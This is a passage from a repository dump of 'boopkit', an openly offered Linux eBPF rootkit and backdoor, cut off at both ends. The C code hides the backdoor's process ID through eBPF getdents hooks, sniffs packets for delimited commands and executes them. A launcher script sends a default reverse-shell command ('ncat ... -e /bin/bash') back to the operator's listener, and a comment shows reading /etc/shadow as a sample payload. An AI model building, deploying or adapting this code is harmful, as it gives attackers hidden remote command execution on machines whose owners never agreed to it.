===========================================================================\n  // [pr0be.safe.o]\n  {\n    boopprintf(\"  -> Loading eBPF Probe      : %s\\n\", cfg.pr0besafepath);\n    sfobj = pr0be_safe__open();\n    // getpid()\n    env.pid_to_hide = getpid();\n    sprintf(pid, \"%d\", env.pid_to_hide);\n    strncpy(sfobj->rodata->pid_to_hide, pid,\n            sizeof(sfobj->rodata->pid_to_hide));\n\n    sfobj->rodata->pid_to_hide_len = strlen(pid) + 1;\n    sfobj->rodata->target_ppid = 0;\n    loaded = pr0be_safe__load(sfobj);\n    if (loaded < 0) {\n      boopprintf(\"Unable to load eBPF object: %s\\n\", cfg.pr0besafepath);\n      boopprintf(\"Privileged access required to load eBPF probe!\\n\");\n      boopprintf(\"Permission denied.\\n\");\n      return 1;\n    }\n    boopprintf(\"  ->   eBPF Probe Loaded     : %s\\n\", cfg.pr0besafepath);\n    int index = 1;\n    int prog_fd = bpf_program__fd(sfobj->progs.handle_getdents_exit);\n    int ret = bpf_map_update_elem(bpf_map__fd(sfobj->maps.map_prog_array),\n                                  &index, &prog_fd, BPF_ANY);\n    if (ret == -1) {\n      boopprintf(\"Failed to hide PID: %s\\n\", strerror(errno));\n      return 1;\n    }\n    index = 2;\n    prog_fd = bpf_program__fd(sfobj->progs.handle_getdents_patch);\n    ret = bpf_map_update_elem(bpf_map__fd(sfobj->maps.map_prog_array), &index,\n                              &prog_fd, BPF_ANY);\n    if (ret == -1) {\n      boopprintf(\"Failed to obfuscated PID\\n\");\n      return 1;\n    }\n    err = pr0be_safe__attach(sfobj);\n    if (err) {\n      boopprintf(\"Failed to attach %s\\n\", cfg.pr0besafepath);\n      return 1;\n    }\n    rb = ring_buffer__new(bpf_map__fd(sfobj->maps.rb), cb_pid_lookup, NULL,\n                          NULL);\n    if (!rb) {\n      boopprintf(\"Failed to create ring buffer\\n\");\n      return 1;\n    }\n  }\n  // [pr0be.safe.o]\n  // ===========================================================================\n\n  // ===========================================================================\n  // [pr0be.boop.o]\n  {\n    boopprintf(\"  -> Loading eBPF Probe      : %s\\n\", cfg.pr0bebooppath);\n    bpobj = bpf_object__open(cfg.pr0bebooppath);\n    if (!bpobj) {\n      boopprintf(\"Unable to open eBPF object: %s\\n\", cfg.pr0bebooppath);\n      boopprintf(\"Privileged access required to load eBPF probe!\\n\");\n      boopprintf(\"Permission denied.\\n\");\n      return 1;\n    }\n    loaded = bpf_object__load(bpobj);\n    if (loaded < 0) {\n      boopprintf(\"Unable to load eBPF object: %s\\n\", cfg.pr0bebooppath);\n      return 1;\n    }\n    boopprintf(\"  ->   eBPF Probe Loaded     : %s\\n\", cfg.pr0bebooppath);\n    bpf_object__next_map(bpobj, NULL);\n    bpf_object__for_each_program(progboop, bpobj) {\n      const char *progname = bpf_program__name(progboop);\n      const char *progsecname = bpf_program__section_name(progboop);\n      boopprintf(\"  ->   eBPF Program Attached : %s\\n\", progsecname);\n      struct bpf_link *link = bpf_program__attach(progboop);\n      if (!link) {\n        boopprintf(\"Unable to link eBPF program: %s\\n\", progname);\n        continue;\n      }\n    }\n  }\n  // [pr0be.boop.o]\n  // ===========================================================================\n\n  struct bpf_map *bpmap = bpf_object__next_map(bpobj, NULL);\n  const char *bmapname = bpf_map__name(bpmap);\n  boopprintf(\"  ->   eBPF   Map Name       : %s\\n\", bmapname);\n  int fd = bpf_map__fd(bpmap);\n\n  // logs\n  for (int i = 0; i < cfg.denyc; i++) {\n    boopprintf(\"  XX Deny address            : %s\\n\", cfg.deny[i]);\n  }\n  boopprintf(\"  -> Obfuscating PID         : %s\\n\", pid);\n  sleep(1);\n  boopprintf(\n      \"================================================================\\n\");\n\n  int ignore = 0;\n  while (runtime__boopkit) {\n    ring_buffer__poll(rb, 100);  // Ignore errors!\n    // perf_buffer__poll(pb, 100); // Ignore errors!\n\n    int ikey = 0, jkey;\n    int err;\n    __u8 saddrbytes[4];\n    struct event_boop_t ret;\n\n    while (!bpf_map_get_next_key(fd, &ikey, &jkey)) {\n      err = bpf_map_lookup_elem(fd, &jkey, &ret);\n      if (err < 0) {\n        continue;\n      }\n\n      // Calculate saddrval\n      char saddrval[INET_ADDRSTRLEN];  // Saturn Valley. If you know, you know.\n      memcpy(saddrbytes, ret.saddr, sizeof saddrbytes);\n      inet_ntop(AF_INET, &saddrbytes, saddrval, sizeof(saddrval));\n\n      // Filter boop addrs\n      ignore = 0;\n      for (int i = 0; i < cfg.denyc; i++) {\n        if (strncmp(saddrval, cfg.deny[i], INET_ADDRSTRLEN) == 0) {\n          // Ignoring string in deny list\n          ignore = 1;\n          break;\n        }\n      }\n      if (ignore) {\n        //boopprintf(\"  ** Ignoring boop from source: %s\\n\", saddrval);\n        bpf_map_delete_elem(fd, &jkey);\n        ikey = jkey;\n        continue;\n      }\n      boopprintf(\"  ** Boop source: %s\\n\", saddrval);\n\n      // Always check for RCE in the ring buffer.\n      char *rce = malloc(MAX_RCE_SIZE);\n      int xcap_found;\n\n      xcap_found = xcaprce(saddrval, rce);\n      if (xcap_found == 1) {\n        exec(rce);\n        bpf_map_delete_elem(fd, &jkey);\n        ikey = jkey;\n        continue;\n      }\n\n      if (cfg.reverseconn) {\n        boopprintf(\"  -> Reverse connect() %s for RCE\\n\", saddrval);\n        int retval;\n        retval = recvrce(saddrval, rce);\n        if (retval == 0) {\n          exec(rce);\n          bpf_map_delete_elem(fd, &jkey);\n          ikey = jkey;\n          continue;\n        }\n      }\n\n      bpf_map_delete_elem(fd, &jkey);\n      ikey = jkey;\n    }\n  }\n}\n"
        },
        {
          "name": "boopkit.h",
          "type": "blob",
          "size": 2.5810546875,
          "content": "// Copyright © 2022 Kris Nóva <kris@nivenly.com>\n//\n// Licensed under the Apache License, Version 2.0 (the \"License\");\n// you may not use this file except in compliance with the License.\n// You may obtain a copy of the License at\n//\n//     http://www.apache.org/licenses/LICENSE-2.0\n//\n// Unless required by applicable law or agreed to in writing, software\n// distributed under the License is distributed on an \"AS IS\" BASIS,\n// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n// See the License for the specific language governing permissions and\n// limitations under the License.\n//\n// ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗\n// ████╗  ██║██╔═████╗██║   ██║██╔══██╗\n// ██╔██╗ ██║██║██╔██║██║   ██║███████║\n// ██║╚██╗██║████╔╝██║╚██╗ ██╔╝██╔══██║\n// ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║\n// ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝\n//\n\n#ifndef BOOPKIT_BOOPKIT_H\n#define BOOPKIT_BOOPKIT_H\n\n// MAX_RCE_SIZE is the maximum size of a boop command to execute.\n#define MAX_RCE_SIZE 1024\n\n#define EVENT_SRC_BAD_CSUM 1\n#define EVENT_SRC_RECEIVE_RESET 2\n\n// event_boop_t represents an event from the kernel.\n//\n// We will pass as much data up to userspace as possible.\n// The convention is to not mutate the data in the eBPF probe\n// but rather translate the data to userspace as quickly as possible.\n//\n// The userspace component will be responsible for making sense\n// of whatever data is transferred in an event.\n//\n// NOTE: All event_boop_t fields MUST be used in a probe in order\n// to pass the eBPF verifier!\nstruct event_boop_t {\n  // saddr is 28 fucking bytes\n  __u8 saddr[28];\n\n  // an enumerated type of EVENT_SRC_* from above\n  int event_src_code;\n};\n\n// PORT for the boopkit TCP protocol for boopscript RCE\n#define PORT 3535\n\n#define DEFAULT_PCAP_INTERFACE \"lo\"\n\n// MAX_DENY_ADDRS is the maximum amount of address that can be denied.\n#define MAX_DENY_ADDRS 1024\n\n// eBPF Probes\n#define PROBE_BOOP \"pr0be.boop.o\"\n#define PROBE_SAFE \"pr0be.safe.o\"\n#define PROBE_XDP \"pr0be.xdp.o\"\n\n// TIMEOUT_SECONDS_RECVRCE timeout seconds for recvrce()\n#define TIMEOUT_SECONDS_RECVRCE 1\n\nstruct pkt_trace_metadata {\n  __u32 ifindex;\n  __u32 rx_queue;\n  __u16 pkt_len;\n  __u16 cap_len;\n  __u16 flags;\n  __u16 prog_index;\n  int action;\n} __packed;\n\n#endif  // BOOPKIT_BOOPKIT_H\n"
        },
        {
          "name": "boopscript",
          "type": "blob",
          "size": 2.814453125,
          "content": "#!/bin/bash\n# Copyright © 2022 Kris Nóva <kris@nivenly.com>\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\n# ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗\n# ████╗  ██║██╔═████╗██║   ██║██╔══██╗\n# ██╔██╗ ██║██║██╔██║██║   ██║███████║\n# ██║╚██╗██║████╔╝██║╚██╗ ██╔╝██╔══██║\n# ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║\n# ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝\n\n# [Remote address]\n#\n# This is the boopscript (public) address of\n# the server running boopkit.\nRHOST=${RHOST:-\"127.0.0.1\"}\nRPORT=${RPORT:-\"22\"}\n\n# [Local address]\n#\n# This is the local (public) address of\n# the machine that boopkit will call back to.\n#\n# Boopkit hard-codes port \"3535\" for the callback!\nLHOST=${LHOST:-\"127.0.0.1\"}\nLPORT=${LPORT:-\"3535\"}\n\n# SINGLE_SYN will run the boopkit-boop client\n# in payload only mode. This means we will\n# try to attach our RCE as a payload in a single\n# SYN packet!\nSINGLE_SYN=0\n\n# [Reverse shell]\n#\n# Use netcat to listen locally for a shell.\nNCAT=\"/usr/bin/ncat\"\n# After we have sent our command back over boopkit's\n# protocol on 3535 we need a 2nd port to listen against.\nNCATLISTENPORT=\"3545\"\n\n# Remote Command Execution\n#\n# The command to run on the server!\n# ================================================\nRCE=${RCE:-\"ncat ${LHOST} ${NCATLISTENPORT} -e /bin/bash &\"}\n# ================================================\n\n# Trigger is used to fire the eBPF probe on the server.\ntrigger(){\n    sleep 1\n    boopkit-boop \\\n      -lhost $LHOST \\\n      -lport $LPORT \\\n      -rhost $RHOST \\\n      -rport $RPORT \\\n      -c \"$RCE\" ${P}\n}\n\n# Check for permissions to host a local socket.\nif [ \"$EUID\" -ne 0 ]; then\n  echo \"Permission denied.\"\n  exit\nfi\n\nP=\"\"\nif [ \"$SINGLE_SYN\" -ne 0 ]; then\n  P=\"-p\"\nfi\n\n# Right away trigger the backdoor on the server\ntrigger &\n\n# Also begin listening for the return RCE\n#\n# Note: this is only required if you are performing\n# a reverse shell!\n#\n# Remind the user of how to use shell stabilization\necho \"\"\necho \"python -c \\\"import pty; pty.spawn('/bin/bash')\\\"\"\necho \"\"\n${NCAT} -lvp ${NCATLISTENPORT}\n"
        },
        {
          "name": "boopscript-launcher",
          "type": "blob",
          "size": 1.265625,
          "content": "#!/bin/bash\n# Copyright © 2022 Kris Nóva <kris@nivenly.com>\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n#\n# ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗\n# ████╗  ██║██╔═████╗██║   ██║██╔══██╗\n# ██╔██╗ ██║██║██╔██║██║   ██║███████║\n# ██║╚██╗██║████╔╝██║╚██╗ ██╔╝██╔══██║\n# ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║\n# ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝\n\nmake\nmake install\nboopkit \\\n  -s \\\n  -p \\\n  -x 10.0.0.244 \\\n  -x 0.0.0.0 \\\n  -x 10.0.0.188"
        },
        {
          "name": "common.c",
          "type": "blob",
          "size": 3.3193359375,
          "content": "// Copyright © 2022 Kris Nóva <kris@nivenly.com>\n//\n// Licensed under the Apache License, Version 2.0 (the \"License\");\n// you may not use this file except in compliance with the License.\n// You may obtain a copy of the License at\n//\n//     http://www.apache.org/licenses/LICENSE-2.0\n//\n// Unless required by applicable law or agreed to in writing, software\n// distributed under the License is distributed on an \"AS IS\" BASIS,\n// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n// See the License for the specific language governing permissions and\n// limitations under the License.\n//\n// ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗\n// ████╗  ██║██╔═████╗██║   ██║██╔══██╗\n// ██╔██╗ ██║██║██╔██║██║   ██║███████║\n// ██║╚██╗██║████╔╝██║╚██╗ ██╔╝██╔══██║\n// ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║\n// ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝\n//\n// [common.c]\n\n#include \"common.h\"\n\n#include <stdarg.h>\n#include <stdio.h>\n\n//#include \"boopkit.h\"\n\nint quiet = 0;\n\nvoid boopprintf(const char *format, ...) {\n  if (quiet) {\n    return;\n  }\n  va_list args;\n  va_start(args, format);\n  vprintf(format, args);\n  va_end(args);\n}\n\n// asciiheader is the main runtime banner.\nvoid asciiheader() {\n  if (quiet) {\n    return;\n  }\n  printf(\n      \"\\n================================================================\\n\");\n  printf(\"\\n\");\n  printf(\"    ██████╗  ██████╗  ██████╗ ██████╗ ██╗  ██╗██╗████████╗\\n\");\n  printf(\"    ██╔══██╗██╔═══██╗██╔═══██╗██╔══██╗██║ ██╔╝██║╚══██╔══╝\\n\");\n  printf(\"    ██████╔╝██║   ██║██║   ██║██████╔╝█████╔╝ ██║   ██║   \\n\");\n  printf(\"    ██╔══██╗██║   ██║██║   ██║██╔═══╝ ██╔═██╗ ██║   ██║   \\n\");\n  printf(\"    ██████╔╝╚██████╔╝╚██████╔╝██║     ██║  ██╗██║   ██║   \\n\");\n  printf(\"    ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝     ╚═╝  ╚═╝╚═╝   ╚═╝   \\n\");\n  printf(\"    Author: Kris Nóva <kris@nivenly.com> Version %s\\n\", VERSION);\n  printf(\"    \\n\");\n  printf(\"    IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE \\n\");\n  printf(\"    LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, \\n\");\n  printf(\"    EXEMPLARY, OR CONSEQUENTIAL DAMAGES.\");\n  printf(\"    \\n\\n\");\n  printf(\"    DO NOT ATTEMPT TO USE THE TOOLS TO VIOLATE THE LAW.\\n\");\n  printf(\"    THE AUTHOR IS NOT RESPONSIBLE FOR ANY ILLEGAL ACTION.\\n\");\n  printf(\"    MISUSE OF THE SOFTWARE, INFORMATION, OR SOURCE CODE\\n\");\n  printf(\"    MAY RESULT IN CRIMINAL CHARGES.\\n\");\n  printf(\"    \\n\");\n  printf(\"    Use at your own risk.\\n\");\n  printf(\"\\n\");\n  printf(\"================================================================\\n\");\n}\n"
        },
        {
          "name": "common.h",
          "type": "blob",
          "size": 0.36328125,
          "content": "//\n// Created by nova on 4/11/22.\n//\n\n#ifndef BOOPKIT_COMMON_H\n#define BOOPKIT_COMMON_H\n\n#define BOOPKIT_RCE_DELIMITER \"X*x.x*X\"\n#define BOOPKIT_RCE_CMD_HALT \"X*x.HALT.x*X\"\n\nextern int quiet;\n\n// VERSION is the semantic version of the program\n#define VERSION \"1.4.0\"\n\nvoid asciiheader();\nvoid boopprintf(const char *__restrict __format, ...);\n\n#endif  // BOOPKIT_COMMON_H\n"
        },
        {
          "name": "contrib",
          "type": "tree",
          "content": null
        },
        {
          "name": "dpi.c",
          "type": "blob",
          "size": 10.1884765625,
          "content": "// Copyright © 2022 Kris Nóva <kris@nivenly.com>\n//\n// Licensed under the Apache License, Version 2.0 (the \"License\");\n// you may not use this file except in compliance with the License.\n// You may obtain a copy of the License at\n//\n//     http://www.apache.org/licenses/LICENSE-2.0\n//\n// Unless required by applicable law or agreed to in writing, software\n// distributed under the License is distributed on an \"AS IS\" BASIS,\n// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n// See the License for the specific language governing permissions and\n// limitations under the License.\n//\n// ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗\n// ████╗  ██║██╔═████╗██║   ██║██╔══██╗\n// ██╔██╗ ██║██║██╔██║██║   ██║███████║\n// ██║╚██╗██║████╔╝██║╚██╗ ██╔╝██╔══██║\n// ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║\n// ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝\n//\n// [dpi.c]\n\n#define _GNU_SOURCE\n#include <net/ethernet.h>\n#include <netinet/ip.h>\n#include <pcap.h>\n#include <pthread.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n// clang-format off\n#include \"dpi.h\"\n#include \"common.h\"\n// clang-format on\n\n/**\n * xcap_ring_buffer is the global ring buffer for dpi.c\n */\nxcap_ip_packet *xcap_ring_buffer[XCAP_BUFFER_SIZE];\n\n/**\n * xcap_pos is the position of the stack iterator for\n * the global xcap_ring_buffer.\n */\nint xcap_pos = 0;\n\n/**\n * runtime__xcap is the condition to continue to capture packets.\n */\nint runtime__xcap = 1;\n\n/**\n * dpi.c must be thread safe, this is the ring buffer mutex for mutating\n * memory.\n */\npthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;\n\n/**\n * xpack_dump is a debug method that is used to debug print\n * a single packet.\n *\n * Dear non-linear time life Nóva, I love you for writing this.\n *\n * @param xpack the packet to debug\n */\nvoid xpack_dump(xcap_ip_packet *xpack) {\n  boopprintf(\"  -> Dumping Raw Xpack:\\n\");\n  unsigned char *packet = xpack->packet;\n  for (int j = 0; j < xpack->header->caplen; j++) {\n    boopprintf(\"%c\", packet[j]);\n  }\n  boopprintf(\"\\n\");\n}\n\n/**\n * xcap_ring_buffer_dump is a debug method that can be used\n * to debug all captured packets in a ring buffer.\n *\n * @param xbuff\n */\nvoid xcap_ring_buffer_dump(xcap_ip_packet *xbuff[XCAP_BUFFER_SIZE]) {\n  boopprintf(\"  -> Dumping Raw xCap Buffer:\\n\");\n  for (int i = 0; i < XCAP_BUFFER_SIZE; i++) {\n    struct xcap_ip_packet *xpack;\n    xpack = xbuff[i];\n    if (!xpack->captured || xpack->header->caplen < 1) {\n      continue;\n    }\n    xpack_dump(xpack);\n  }\n}\n\n/**\n * xcap_ring_buffer_free is used to free up a ring buffer.\n *\n * @param xbuff the ring buffer to free\n */\nvoid xcap_ring_buffer_free(xcap_ip_packet *xbuff[XCAP_BUFFER_SIZE]) {\n  boopprintf(\"  -> Free Ring Buffer\\n\");\n  for (int i = 0; i < XCAP_BUFFER_SIZE; i++) {\n    struct xcap_ip_packet *xpack;\n    xpack = xbuff[i];\n    xpack->captured = 0;\n    free(xpack->packet);\n    free(xpack->iph);\n    free(xpack->header);\n    free(xpack);\n  }\n}\n\n/**\n * xcap_ring_buffer_init must be used to initalize a new ring buffer!\n *\n * @param xbuff is the ring buffer to initialize\n */\nvoid xcap_ring_buffer_init(xcap_ip_packet *xbuff[XCAP_BUFFER_SIZE]) {\n  boopprintf(\"  -> Initalizing Ring Buffer\\n\");\n  for (int i = 0; i < XCAP_BUFFER_SIZE; i++) {\n    struct xcap_ip_packet *xpack = malloc(sizeof(struct xcap_ip_packet));\n    xpack->packet = malloc(1);  // Init to 1 byte to begin!\n    xpack->iph = malloc(sizeof(struct ip));\n    xpack->header = malloc(sizeof(struct pcap_pkthdr));\n    xpack->captured = 0;\n    xbuff[i] = xpack;\n  }\n}\n\n/**\n * rce_filter will filter an RCE value from in between\n * the BOOPKIT_RCE_DELIMITER\n *\n * Such as:\n *    raw:  X*x.x*Xcat /etc/shadowX*x.x*X\n *    rce: /etc/shadow\n * @param raw\n * @param rce\n * @return 1 success, 0 failure\n */\nint rce_filter(char *raw, char *rce) {\n  char *target = NULL;\n  char *start, *end;\n  start = strstr(raw, BOOPKIT_RCE_DELIMITER);\n  if (start) {\n    start += strlen(BOOPKIT_RCE_DELIMITER);\n    end = strstr(start, BOOPKIT_RCE_DELIMITER);\n    if (end) {\n      target = (char *)malloc(end - start + 1);\n      memcpy(target, start, end - start);\n      target[end - start] = '\\0';\n    }\n  }\n  if (target) {\n    strncpy(rce, target, strlen(target) + 1);\n    free(target);\n    return 1;\n  }\n  return 0;\n}\n\n/**\n * xcap will listen on a specific Linux interface and capture\n * raw network packets into a ring buffer at runtime.\n *\n * Run this in a unique thread to process packets on the backend.\n * @param v_dev_name\n * @return\n */\nvoid *xcap(void *v_dev_name) {\n  char *dev_name = (char *)v_dev_name;\n  char filter_exp[] = \"\";\n  int cycle = 0;\n\n  pcap_t *handle;\n  char errbuf[PCAP_ERRBUF_SIZE];\n  bpf_u_int32 mask;\n  bpf_u_int32 net;\n\n  struct bpf_program fp;\n  struct pcap_pkthdr header;\n  struct ether_header *ep;\n  unsigned short ether_type;\n  const u_char *packet;\n  struct ip *iph;\n\n  boopprintf(\"  -> Starting xCap Interface : %s\\n\", dev_name);\n\n  if (pcap_lookupnet(dev_name, &net, &mask, errbuf) == -1) {\n    boopprintf(\"Couldn't get netmask for device %s: %s\\n\", dev_name, errbuf);\n    net = 0;\n    mask = 0;\n  }\n\n  handle = pcap_open_live(dev_name, BUFSIZ, 1, 1000, errbuf);\n  if (handle == NULL) {\n    boopprintf(\"Couldn't open device %s: %s\\n\", dev_name, errbuf);\n    return NULL;\n  }\n\n  if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {\n    boopprintf(\"Couldn't parse filter %s: %s\\n\", filter_exp,\n               pcap_geterr(handle));\n    return NULL;\n  }\n  if (pcap_setfilter(handle, &fp) == -1) {\n    boopprintf(\"Couldn't install filter %s: %s\\n\", filter_exp,\n               pcap_geterr(handle));\n    return NULL;\n  }\n\n  xcap_ring_buffer_init(xcap_ring_buffer);\n  boopprintf(\"  -> xCap RingBuffer Started : %s\\n\", dev_name);\n\n  while (runtime__xcap) {\n    packet = pcap_next(handle, &header);\n    ep = (struct ether_header *)packet;\n    ether_type = ntohs(ep->ether_type);\n    if (ether_type != ETHERTYPE_IP) {\n      continue;\n    }\n    packet += sizeof(struct ether_header);\n    iph = (struct ip *)packet;\n\n    // Debug system for source addr\n    //char buf[INET_ADDRSTRLEN];\n    //inet_ntop(AF_INET, &iph->ip_src, buf, sizeof buf);\n    //boopprintf(\"IP Source: %s\\n\", buf);\n\n    if (xcap_pos == XCAP_BUFFER_SIZE) {\n      xcap_pos = 0;\n      cycle = 1;\n    }\n    if (cycle) {\n      pthread_mutex_lock(&lock);\n      free(xcap_ring_buffer[xcap_pos]->packet);\n      free(xcap_ring_buffer[xcap_pos]->iph);\n      free(xcap_ring_buffer[xcap_pos]->header);\n      free(xcap_ring_buffer[xcap_pos]);\n      pthread_mutex_unlock(&lock);\n    }\n\n    // Write a new xpack to the ring buffer\n    struct xcap_ip_packet *xpack = malloc(sizeof(xcap_ip_packet));\n    xpack->packet = malloc(header.len);\n    xpack->iph = malloc(sizeof(struct ip));\n    xpack->header = malloc(sizeof(struct pcap_pkthdr));\n    xpack->captured = 1;\n    memcpy(xpack->packet, packet, header.len);\n    memcpy(xpack->iph, iph, sizeof(struct ip));\n    memcpy(xpack->header, &header, sizeof(struct pcap_pkthdr));\n    pthread_mutex_lock(&lock);\n    xcap_ring_buffer[xcap_pos] = xpack;\n    pthread_mutex_unlock(&lock);\n    xcap_pos++;\n  }\n\n  xcap_ring_buffer_free(xcap_ring_buffer);\n  pcap_close(handle);\n  return NULL;\n}\n\n/**\n * snapshot will effectively lock the global xcap_ring_buffer and take a\n * snapshot of the packets in memory.\n *\n * @param snap a fresh copy of the memory when the snapshot was taken.\n * @return 1 success\n */\nint snapshot(xcap_ip_packet *snap[XCAP_BUFFER_SIZE]) {\n  boopprintf(\"  -> Taking snapshot of network traffic.\\n\");\n  pthread_mutex_lock(&lock);\n  for (int i = 0; i < XCAP_BUFFER_SIZE; i++) {\n    struct xcap_ip_packet *from = xcap_ring_buffer[i];\n    struct xcap_ip_packet *to = malloc(sizeof(xcap_ip_packet));\n    if (!from->captured) {\n      continue;\n    }\n\n    // capture\n    to->captured = from->captured;\n\n    // packet\n    to->packet = malloc(from->header->caplen);\n    memcpy(to->packet, from->packet, from->header->caplen);\n\n    // iph\n    to->iph = malloc(sizeof(struct ip));\n    memcpy(to->iph, from->iph, sizeof(struct ip));\n\n    // header\n    to->header = malloc(sizeof(struct pcap_pkthdr));\n    memcpy(to->header, from->header, sizeof(struct pcap_pkthdr));\n    snap[i] = to;\n  }\n  pthread_mutex_unlock(&lock);\n  return 1;\n}\n\n/**\n * xcaprce is used to look for an RCE in the ring buffer.\n *\n * @param search is the IP address to filter packets on (perfomance)\n * @param rce is the RCE to execute, as filtered as possible\n * @return\n */\nint xcaprce(char search[INET_ADDRSTRLEN], char *rce) {\n  sleep(1);  // Wait for the kernel to catch up :)\n  boopprintf(\"  -> Search xCap Ring Buffer: %s\\n\", search);\n  xcap_ip_packet *snap[XCAP_BUFFER_SIZE];\n  xcap_ring_buffer_init(snap);\n  snapshot(snap);\n\n  // Search\n  for (int i = 0; i < XCAP_BUFFER_SIZE; i++) {\n    struct xcap_ip_packet *xpack;\n    xpack = snap[i];\n    if (!xpack->captured) {\n      continue;\n    }\n\n    char *xpack_saddr = inet_ntoa(xpack->iph->ip_src);\n    //boopprintf(\"xpack source addr: %s\\n\", xpack_saddr);\n\n    char *ret = strstr(search, xpack_saddr);\n    if (!ret) {\n      continue;  // Filter packets not from our IP address\n    }\n\n    // Ring Buffer Packet Debugging Time\n    //xpack_dump(xpack);\n\n    // Debug system for source addr\n    //char buf[INET_ADDRSTRLEN];\n    //inet_ntop(AF_INET, &xpack->iph->ip_src, buf, sizeof buf);\n    //boopprintf(\"IP Source: %s\\n\", buf);\n\n    // Begin DPI\n    unsigned char *packet = xpack->packet;\n    char *rce_sub;\n    rce_sub = memmem(packet, xpack->header->caplen, BOOPKIT_RCE_DELIMITER,\n                     strlen(BOOPKIT_RCE_DELIMITER));\n    if (rce_sub != NULL) {\n      boopprintf(\"  -> Found RCE xCap!\\n\");\n      int found;\n      found = rce_filter(rce_sub, rce);\n      // Flush the snapshot\n      xcap_ring_buffer_free(snap);\n\n      // Flush the main ring buffer\n      xcap_ring_buffer_free(xcap_ring_buffer);\n      xcap_ring_buffer_init(xcap_ring_buffer);\n      if (found) {\n        return 1;\n      } else {\n        boopprintf(\"  XX [FILTER FAILURE] No RCE in xCap!\\n\");\n        return 0;\n      }\n    }\n  }\n  boopprintf(\"  -> No RCE in xCap!\\n\");\n  xcap_ring_buffer_free(snap);\n  return 0;\n}\n"
        },
        {
          "name": "dpi.h",
          "type": "blob",
          "size": 1.7509765625,
          "content": "// Copyright © 2022 Kris Nóva <kris@nivenly.com>\n//\n// Licensed under the Apache License, Version 2.0 (the \"License\");\n// you may not use this file except in compliance with the License.\n// You may obtain a copy of the License at\n//\n//     http://www.apache.org/licenses/LICENSE-2.0\n//\n// Unless required by applicable law or agreed to in writing, software\n// distributed under the License is distributed on an \"AS IS\" BASIS,\n// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n// See the License for the specific language governing permissions and\n// limitations under the License.\n//\n// ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗\n// ████╗  ██║██╔═████╗██║   ██║██╔══██╗\n// ██╔██╗ ██║██║██╔██║██║   ██║███████║\n// ██║╚██╗██║████╔╝██║╚██╗ ██╔╝██╔══██║\n// ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║\n// ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝\n//\n// [dpi.h]\n\n#ifndef BOOPKIT_DPI_H\n#define BOOPKIT_DPI_H\n\n/**\n * XCAP_BUFFER_SIZE is the size of the ring buffer for us to store\n * packets in memory to search for an RCE.\n *\n * The larger the memory footprint the higher the chance of finding\n * and RCE in memory.\n */\n#define XCAP_BUFFER_SIZE 524288\n\nextern int runtime__xcap;\n\ntypedef struct xcap_ip_packet {\n  int captured;\n  struct ip *iph;\n  unsigned char *packet;\n  struct pcap_pkthdr *header;\n} xcap_ip_packet;\n\nvoid *xcap(void *v_dev_name);\nint xcaprce(char search[INET_ADDRSTRLEN], char *rce);\n\n#endif  // BOOPKIT_DPI_H"
        },
        {
          "name": "pr0be.boop.c",
          "type": "blob",
          "size": 4.9501953125,
          "content": "// Copyright © 2022 Kris Nóva <kris@nivenly.com>\n//\n// Licensed under the Apache License, Version 2.0 (the \"License\");\n// you may not use this file except in compliance with the License.\n// You may obtain a copy of the License at\n//\n//     http://www.apache.org/licenses/LICENSE-2.0\n//\n// Unless required by applicable law or agreed to in writing, software\n// distributed under the License is distributed on an \"AS IS\" BASIS,\n// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n// See the License for the specific language governing permissions and\n// limitations under the License.\n//\n// ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗\n// ████╗  ██║██╔═████╗██║   ██║██╔══██╗\n// ██╔██╗ ██║██║██╔██║██║   ██║███████║\n// ██║╚██╗██║████╔╝██║╚██╗ ██╔╝██╔══██║\n// ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║\n// ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝\n//\n// clang-format off\n#include 